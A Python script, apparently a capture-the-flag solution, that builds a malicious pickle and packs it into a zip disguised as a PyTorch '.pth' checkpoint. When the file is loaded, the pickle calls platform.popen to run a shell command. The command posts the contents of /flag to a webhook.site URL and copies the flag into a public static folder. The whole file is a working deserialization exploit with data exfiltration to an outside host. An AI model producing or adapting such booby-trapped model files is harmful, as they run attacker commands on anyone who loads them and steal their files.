import pickle
import zipfile
import io
import torch

# CONFIGURATION
# Replace with your actual webhook URL 
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

STACK_GLOBAL = b'\x93'

def push_str(s):
    b = s.encode('utf-8')
    return b'X' + (len(b)).to_bytes(4, 'little') + b

pkl = b'\x80\x02'

# 尝试: platform.popen('cmd')
pkl += push_str('platform')
pkl += push_str('popen')
pkl += STACK_GLOBAL 

pkl += push_str(CMD)
pkl += b'\x85' # tuple
pkl += b'R'    # CALL platform.popen(CMD)
pkl += b'.'

def create_torch_zip(pickle_bytes):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/data.pkl', pickle_bytes)
        zf.writestr('archive/version', b'3\n')
    return buffer.getvalue()

if __name__ == "__main__":
    final_zip = create_torch_zip(pkl)
    with open("nailong_payload_v12.pth", "wb") as f:
        f.write(final_zip)
    print("[+] Generated nailong_payload_v12.pth (platform.popen in Zip)")
